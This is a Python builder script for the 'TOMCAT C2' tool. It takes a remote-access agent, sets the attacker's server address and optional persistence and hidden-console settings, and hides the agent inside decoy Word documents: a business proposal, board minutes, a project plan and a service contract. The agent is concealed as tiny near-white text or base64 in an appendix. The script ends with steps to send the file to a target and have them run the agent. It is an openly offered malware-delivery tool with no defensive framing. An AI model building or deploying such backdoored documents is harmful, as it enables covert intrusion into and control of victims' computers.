#!/usr/bin/env python3

"""
TOMCAT C2 - Build Backdoored DOCX
Creates Word document with embedded TOMCAT agent that auto-connects to your C2 server
Author: TOM7
"""

import base64
import os
import subprocess
import sys

try:
    from docx import Document
    from docx.enum.text import WD_ALIGN_PARAGRAPH
    from docx.oxml.ns import qn
    from docx.shared import Inches, Pt, RGBColor
except ImportError:
    print("[!] python-docx not installed. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-docx"])
    from docx import Document
    from docx.enum.text import WD_ALIGN_PARAGRAPH
    from docx.oxml.ns import qn
    from docx.shared import Inches, Pt, RGBColor

# Colors
RED = "\033[0;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[0;34m"
CYAN = "\033[0;36m"
NC = "\033[0m"

AGENT_TEMPLATE = "tomcatv1a.py"


def print_banner():
    banner = f"""
{RED}
    ___________________      _____  _________     ________________ _________  ________
    \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\_   ___ \\ \\_____  \\
      |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |    /    \\  \\/  /  ____/
      |    |   /    |    \\/    Y    \\     \\____/    |    \\    |    \\     \\____/       \\
      |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     \\______  /\\_______ \\
                       \\/         \\/        \\/         \\/                  \\/         \\/
{CYAN}            Build Backdoored DOCX - Auto-Connect to C2 Server
{YELLOW}                   Author: TOM7 | Born For Exploitation{NC}
"""
    print(banner)


def configure_agent(server_host, server_port, hide_console=False, persistence=False):
    """Read and configure agent code with server details"""

    if not os.path.exists(AGENT_TEMPLATE):
        print(f"{RED}[-] Agent template not found: {AGENT_TEMPLATE}{NC}")
        print(f"{YELLOW}[!] Please make sure tomcatv1a.py is in the same directory{NC}")
        return None

    print(f"{BLUE}[*] Reading agent template: {AGENT_TEMPLATE}{NC}")

    try:
        with open(AGENT_TEMPLATE, "r", encoding="utf-8") as f:
            agent_code = f.read()

        # Configure server settings
        agent_code = agent_code.replace(
            'serverHost = "127.0.0.1"', f'serverHost = "{server_host}"'
        )
        agent_code = agent_code.replace(
            "serverPort = 4444", f"serverPort = {server_port}"
        )

        # Configure options
        agent_code = agent_code.replace(
            "HIDE_CONSOLE = False", f"HIDE_CONSOLE = {hide_console}"
        )
        agent_code = agent_code.replace(
            "ADD_PERSISTENCE = False", f"ADD_PERSISTENCE = {persistence}"
        )

        print(f"{GREEN}[+] Agent configured for {server_host}:{server_port}{NC}")
        print(f"{GREEN}[+] Hide Console: {hide_console}{NC}")
        print(f"{GREEN}[+] Persistence: {persistence}{NC}")

        return agent_code

    except Exception as e:
        print(f"{RED}[-] Error reading agent: {e}{NC}")
        return None


def add_heading(doc, text, level=1, color=None):
    """Add formatted heading"""
    heading = doc.add_heading(text, level=level)
    if color:
        for run in heading.runs:
            run.font.color.rgb = color
    return heading


def add_code_block(doc, code, font_size=8, font_color=None):
    """Add formatted code block"""
    para = doc.add_paragraph()
    run = para.add_run(code)
    run.font.name = "Courier New"
    run.font.size = Pt(font_size)
    if font_color:
        run.font.color.rgb = font_color
    return para


def create_business_proposal_docx(
    agent_code, output_docx, company_name="TechCorp Solutions", stealth_level="high"
):
    """Create professional business proposal with embedded agent"""

    print(f"{BLUE}[*] Creating business proposal DOCX: {output_docx}{NC}")
    print(f"{BLUE}[*] Stealth Level: {stealth_level}{NC}")

    doc = Document()

    # Title Page
    title = doc.add_heading("Business Proposal", 0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in title.runs:
        run.font.color.rgb = RGBColor(26, 35, 126)
        run.font.size = Pt(36)

    doc.add_paragraph()
    subtitle = doc.add_paragraph(f"{company_name}")
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in subtitle.runs:
        run.font.size = Pt(20)
        run.font.color.rgb = RGBColor(13, 71, 161)

    doc.add_paragraph()
    date_para = doc.add_paragraph("December 2024")
    date_para.alignment = WD_ALIGN_PARAGRAPH.CENTER

    confidential = doc.add_paragraph("CONFIDENTIAL - FOR INTERNAL USE ONLY")
    confidential.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in confidential.runs:
        run.font.bold = True
        run.font.color.rgb = RGBColor(211, 47, 47)

    doc.add_page_break()

    # Executive Summary
    add_heading(doc, "Executive Summary", level=1, color=RGBColor(13, 71, 161))
    doc.add_paragraph(
        "This proposal outlines a comprehensive strategic partnership opportunity designed to "
        "enhance operational capabilities, drive digital transformation, and accelerate market "
        "growth. Our proven methodology and cutting-edge solutions position us as the ideal "
        "partner for achieving your organizational objectives."
    )
    doc.add_paragraph()

    # Company Overview
    add_heading(doc, "Company Overview", level=1, color=RGBColor(13, 71, 161))
    doc.add_paragraph(
        f"{company_name} is a leading provider of enterprise solutions with over 15 years of "
        "industry experience. We specialize in digital transformation, cloud migration, and "
        "business process optimization, serving Fortune 500 companies across multiple sectors."
    )
    doc.add_paragraph()

    # Proposed Solution
    add_heading(doc, "Proposed Solution", level=1, color=RGBColor(13, 71, 161))
    doc.add_paragraph("Our comprehensive solution encompasses three key pillars:")

    doc.add_paragraph("Infrastructure Modernization", style="List Bullet")
    doc.add_paragraph("Process Automation and Optimization", style="List Bullet")
    doc.add_paragraph("Data Analytics and Business Intelligence", style="List Bullet")
    doc.add_paragraph()

    # Implementation Roadmap
    add_heading(doc, "Implementation Roadmap", level=1, color=RGBColor(13, 71, 161))
    doc.add_paragraph(
        "Phase 1 (Months 1-3): Assessment and Planning\n"
        "Phase 2 (Months 4-6): Infrastructure Deployment\n"
        "Phase 3 (Months 7-9): Integration and Testing\n"
        "Phase 4 (Months 10-12): Optimization and Training"
    )
    doc.add_paragraph()

    # Investment Summary
    add_heading(doc, "Investment Summary", level=1, color=RGBColor(13, 71, 161))
    doc.add_paragraph(
        "Total Investment: $475,000\n"
        "Expected ROI: 285% over 3 years\n"
        "Payback Period: 14 months"
    )

    doc.add_page_break()

    # Technical Appendix
    add_heading(
        doc,
        "Appendix A: Technical Specifications",
        level=1,
        color=RGBColor(13, 71, 161),
    )
    doc.add_paragraph(
        "Technical implementation details and system architecture specifications."
    )
    doc.add_paragraph()

    # Embed agent based on stealth level
    if stealth_level == "low":
        # Visible code
        doc.add_paragraph("System Configuration Code:", style="Heading 3")
        code_with_markers = f"#TOMCAT_AGENT_START\n{agent_code}\n#TOMCAT_AGENT_END"
        add_code_block(doc, code_with_markers, font_size=6)

    elif stealth_level == "medium":
        # Base64 encoded
        encoded = base64.b64encode(agent_code.encode()).decode()
        doc.add_paragraph("Encoded Configuration Parameters:", style="Heading 3")
        chunk_size = 80
        formatted = "\n".join(
            [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]
        )
        add_code_block(doc, f"BASE64:{formatted}", font_size=5)

    else:  # high stealth
        # Nearly invisible
        code_with_markers = f"#TOMCAT_AGENT_START\n{agent_code}\n#TOMCAT_AGENT_END"
        add_code_block(
            doc, code_with_markers, font_size=1, font_color=RGBColor(250, 250, 250)
        )

    doc.save(output_docx)
    print(f"{GREEN}[+] Business proposal DOCX created: {output_docx}{NC}")


def create_meeting_minutes_docx(
    agent_code, output_docx, meeting_date="December 14, 2024"
):
    """Create meeting minutes document with embedded agent"""

    print(f"{BLUE}[*] Creating meeting minutes DOCX: {output_docx}{NC}")

    doc = Document()

    # Header
    title = doc.add_heading("Board Meeting Minutes", 0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in title.runs:
        run.font.color.rgb = RGBColor(0, 77, 64)

    doc.add_paragraph()
    info = doc.add_paragraph(
        f"Date: {meeting_date}\n"
        "Time: 10:00 AM - 12:00 PM\n"
        "Location: Conference Room A\n"
        "Attendees: Executive Board Members"
    )

    doc.add_paragraph()

    # Meeting Content
    add_heading(doc, "1. Call to Order", level=2)
    doc.add_paragraph(
        "The meeting was called to order at 10:00 AM by the Board Chairman. "
        "All board members were present."
    )
    doc.add_paragraph()

    add_heading(doc, "2. Approval of Previous Minutes", level=2)
    doc.add_paragraph(
        "Minutes from the previous meeting were reviewed and approved unanimously."
    )
    doc.add_paragraph()

    add_heading(doc, "3. Financial Report", level=2)
    doc.add_paragraph(
        "The CFO presented Q4 financial results showing 18% revenue growth year-over-year. "
        "Operating expenses remained within budget parameters. The board approved the financial "
        "statements as presented."
    )
    doc.add_paragraph()

    add_heading(doc, "4. Strategic Initiatives Update", level=2)
    doc.add_paragraph(
        "Progress on key strategic initiatives was reviewed:\n"
        "• Digital transformation project: 75% complete\n"
        "• Market expansion: 3 new regions secured\n"
        "• Product development: 2 new products in beta testing"
    )
    doc.add_paragraph()

    add_heading(doc, "5. New Business", level=2)
    doc.add_paragraph(
        "The board discussed and approved the proposed budget for fiscal year 2025. "
        "Capital expenditure requests were reviewed and prioritized."
    )
    doc.add_paragraph()

    add_heading(doc, "6. Adjournment", level=2)
    doc.add_paragraph("Meeting adjourned at 12:00 PM.")

    doc.add_page_break()

    # Appendix with embedded code
    add_heading(doc, "Appendix: Technical Notes", level=1)
    doc.add_paragraph("System configuration and technical implementation details.")
    doc.add_paragraph()

    encoded = base64.b64encode(agent_code.encode()).decode()
    chunk_size = 80
    formatted = "\n".join(
        [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]
    )
    add_code_block(doc, f"ENCODED:{formatted}", font_size=4)

    doc.save(output_docx)
    print(f"{GREEN}[+] Meeting minutes DOCX created: {output_docx}{NC}")


def create_project_plan_docx(
    agent_code, output_docx, project_name="Digital Transformation Initiative"
):
    """Create project plan document with embedded agent"""

    print(f"{BLUE}[*] Creating project plan DOCX: {output_docx}{NC}")

    doc = Document()

    # Title
    title = doc.add_heading(project_name, 0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in title.runs:
        run.font.color.rgb = RGBColor(156, 39, 176)

    subtitle = doc.add_paragraph("Project Plan Document")
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in subtitle.runs:
        run.font.size = Pt(16)

    doc.add_paragraph()

    # Project Overview
    add_heading(doc, "Project Overview", level=1, color=RGBColor(123, 31, 162))
    doc.add_paragraph(
        "This document outlines the comprehensive project plan for the Digital Transformation "
        "Initiative. The project aims to modernize core business systems, implement cloud-based "
        "infrastructure, and establish data-driven decision-making capabilities."
    )
    doc.add_paragraph()

    # Objectives
    add_heading(doc, "Project Objectives", level=1, color=RGBColor(123, 31, 162))
    doc.add_paragraph(
        "Migrate legacy systems to cloud infrastructure", style="List Bullet"
    )
    doc.add_paragraph("Implement enterprise data warehouse", style="List Bullet")
    doc.add_paragraph("Deploy business intelligence tools", style="List Bullet")
    doc.add_paragraph(
        "Establish DevOps practices and CI/CD pipelines", style="List Bullet"
    )
    doc.add_paragraph()

    # Timeline
    add_heading(doc, "Project Timeline", level=1, color=RGBColor(123, 31, 162))

    # Create timeline table
    table = doc.add_table(rows=5, cols=3)
    table.style = "Light Grid Accent 1"

    headers = table.rows[0].cells
    headers[0].text = "Phase"
    headers[1].text = "Duration"
    headers[2].text = "Key Deliverables"

    phases = [
        ("Planning", "Month 1-2", "Requirements, Architecture Design"),
        ("Development", "Month 3-6", "System Development, Integration"),
        ("Testing", "Month 7-8", "QA Testing, UAT"),
        ("Deployment", "Month 9-10", "Production Rollout, Training"),
    ]

    for i, (phase, duration, deliverables) in enumerate(phases, 1):
        row = table.rows[i].cells
        row[0].text = phase
        row[1].text = duration
        row[2].text = deliverables

    doc.add_paragraph()

    # Budget
    add_heading(doc, "Budget Allocation", level=1, color=RGBColor(123, 31, 162))
    doc.add_paragraph(
        "Total Budget: $1,250,000\n"
        "• Infrastructure: $450,000\n"
        "• Software Licenses: $275,000\n"
        "• Professional Services: $375,000\n"
        "• Training: $100,000\n"
        "• Contingency: $50,000"
    )

    doc.add_page_break()

    # Technical Appendix (hidden agent)
    add_heading(doc, "Technical Appendix", level=1, color=RGBColor(123, 31, 162))
    doc.add_paragraph(
        "Technical implementation specifications and configuration details."
    )
    doc.add_paragraph()

    # Hidden code
    code_with_markers = f"#TOMCAT_AGENT_START\n{agent_code}\n#TOMCAT_AGENT_END"
    add_code_block(
        doc, code_with_markers, font_size=1, font_color=RGBColor(248, 248, 248)
    )

    doc.save(output_docx)
    print(f"{GREEN}[+] Project plan DOCX created: {output_docx}{NC}")


def create_contract_docx(
    agent_code, output_docx, party1="ABC Corporation", party2="XYZ Inc"
):
    """Create contract document with embedded agent"""

    print(f"{BLUE}[*] Creating contract DOCX: {output_docx}{NC}")

    doc = Document()

    # Title
    title = doc.add_heading("SERVICE AGREEMENT", 0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    for run in title.runs:
        run.font.size = Pt(24)
        run.font.color.rgb = RGBColor(0, 0, 0)

    doc.add_paragraph()

    # Parties
    doc.add_paragraph(
        f'This Service Agreement ("Agreement") is entered into as of December 14, 2024, '
        f'by and between {party1} ("Provider") and {party2} ("Client").'
    )
    doc.add_paragraph()

    # Sections
    add_heading(doc, "1. SCOPE OF SERVICES", level=2)
    doc.add_paragraph(
        "Provider agrees to furnish professional services as detailed in Exhibit A attached hereto. "
        "Services shall be performed in accordance with industry best practices and applicable standards."
    )
    doc.add_paragraph()

    add_heading(doc, "2. TERM AND TERMINATION", level=2)
    doc.add_paragraph(
        "This Agreement shall commence on January 1, 2025, and continue for a period of twelve (12) months "
        "unless terminated earlier in accordance with the provisions herein."
    )
    doc.add_paragraph()

    add_heading(doc, "3. COMPENSATION", level=2)
    doc.add_paragraph(
        "Client agrees to pay Provider a total fee of $150,000 for services rendered. Payment shall be "
        "made in monthly installments of $12,500, due on the first day of each month."
    )
    doc.add_paragraph()

    add_heading(doc, "4. CONFIDENTIALITY", level=2)
    doc.add_paragraph(
        "Both parties agree to maintain confidentiality of all proprietary information disclosed during "
        "the term of this Agreement. This obligation shall survive termination of the Agreement."
    )
    doc.add_paragraph()

    add_heading(doc, "5. GENERAL PROVISIONS", level=2)
    doc.add_paragraph(
        "This Agreement constitutes the entire agreement between the parties and supersedes all prior "
        "negotiations, representations, or agreements. Any modifications must be made in writing and "
        "signed by both parties."
    )

    doc.add_page_break()

    # Exhibit A (hidden agent)
    add_heading(doc, "EXHIBIT A: Technical Specifications", level=1)
    doc.add_paragraph(
        "Detailed technical specifications and implementation parameters."
    )
    doc.add_paragraph()

    # Encoded agent
    encoded = base64.b64encode(agent_code.encode()).decode()
    chunk_size = 80
    formatted = "\n".join(
        [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)]
    )
    add_code_block(doc, f"BASE64:{formatted}", font_size=3)

    doc.save(output_docx)
    print(f"{GREEN}[+] Contract DOCX created: {output_docx}{NC}")


def main():
    print_banner()

    print(f"{CYAN}[*] TOMCAT C2 Backdoored DOCX Builder{NC}\n")

    # Get server configuration
    print(f"{YELLOW}=== C2 Server Configuration ==={NC}")
    server_host = (
        input(f"{CYAN}[?] Enter C2 Server IP/Host [127.0.0.1]: {NC}").strip()
        or "127.0.0.1"
    )
    server_port = (
        input(f"{CYAN}[?] Enter C2 Server Port [4444]: {NC}").strip() or "4444"
    )

    print(f"\n{YELLOW}=== Agent Options ==={NC}")
    hide_console = (
        input(f"{CYAN}[?] Hide console window? (y/n) [n]: {NC}").strip().lower() == "y"
    )
    persistence = (
        input(f"{CYAN}[?] Enable persistence? (y/n) [n]: {NC}").strip().lower() == "y"
    )

    # Configure agent
    agent_code = configure_agent(
        server_host, int(server_port), hide_console, persistence
    )
    if not agent_code:
        sys.exit(1)

    print(f"\n{YELLOW}=== Document Type ==={NC}")
    print("1. Business Proposal (Professional)")
    print("2. Meeting Minutes (Corporate)")
    print("3. Project Plan (Technical)")
    print("4. Service Contract (Legal)")
    print("5. All Types")

    choice = input(f"{CYAN}[?] Select document type [1]: {NC}").strip() or "1"

    if choice in ["1", "5"]:
        print(f"\n{YELLOW}=== Stealth Level ==={NC}")
        print("low    - Visible code (easy to extract)")
        print("medium - Base64 encoded")
        print("high   - Nearly invisible (recommended)")
        stealth = (
            input(f"{CYAN}[?] Select stealth level [high]: {NC}").strip() or "high"
        )
    else:
        stealth = "high"

    print(f"\n{BLUE}[*] Building backdoored DOCX(s)...{NC}\n")

    if choice == "1":
        company = (
            input(f"{CYAN}[?] Company name [TechCorp Solutions]: {NC}").strip()
            or "TechCorp Solutions"
        )
        create_business_proposal_docx(
            agent_code, "backdoor_proposal.docx", company, stealth
        )
    elif choice == "2":
        date = (
            input(f"{CYAN}[?] Meeting date [December 14, 2024]: {NC}").strip()
            or "December 14, 2024"
        )
        create_meeting_minutes_docx(agent_code, "backdoor_minutes.docx", date)
    elif choice == "3":
        project = (
            input(f"{CYAN}[?] Project name [Digital Transformation]: {NC}").strip()
            or "Digital Transformation Initiative"
        )
        create_project_plan_docx(agent_code, "backdoor_project.docx", project)
    elif choice == "4":
        party1 = (
            input(f"{CYAN}[?] Provider name [ABC Corporation]: {NC}").strip()
            or "ABC Corporation"
        )
        party2 = input(f"{CYAN}[?] Client name [XYZ Inc]: {NC}").strip() or "XYZ Inc"
        create_contract_docx(agent_code, "backdoor_contract.docx", party1, party2)
    elif choice == "5":
        create_business_proposal_docx(
            agent_code, "backdoor_proposal.docx", "TechCorp Solutions", stealth
        )
        create_meeting_minutes_docx(agent_code, "backdoor_minutes.docx")
        create_project_plan_docx(agent_code, "backdoor_project.docx")
        create_contract_docx(agent_code, "backdoor_contract.docx")
        print(f"\n{GREEN}[+] All document types created!{NC}")
    else:
        print(f"{RED}[-] Invalid choice{NC}")
        sys.exit(1)

    print(f"\n{GREEN}{'=' * 60}{NC}")
    print(f"{GREEN}[+] Backdoored DOCX(s) created successfully!{NC}")
    print(f"{GREEN}{'=' * 60}{NC}")
    print(f"\n{CYAN}[*] Usage Instructions:{NC}")
    print(f"1. Start your C2 server: python tomcatv1s.py")
    print(f"2. Send the DOCX to target")
    print(f"3. Target extracts and runs: python extract_doc.py <docx_file>")
    print(f"4. Agent connects to {server_host}:{server_port}")
    print(f"\n{YELLOW}[!] Agent Configuration:{NC}")
    print(f"    Server: {server_host}:{server_port}")
    print(f"    Hide Console: {hide_console}")
    print(f"    Persistence: {persistence}")
    if choice in ["1", "5"]:
        print(f"    Stealth Level: {stealth}")


if __name__ == "__main__":
    main()
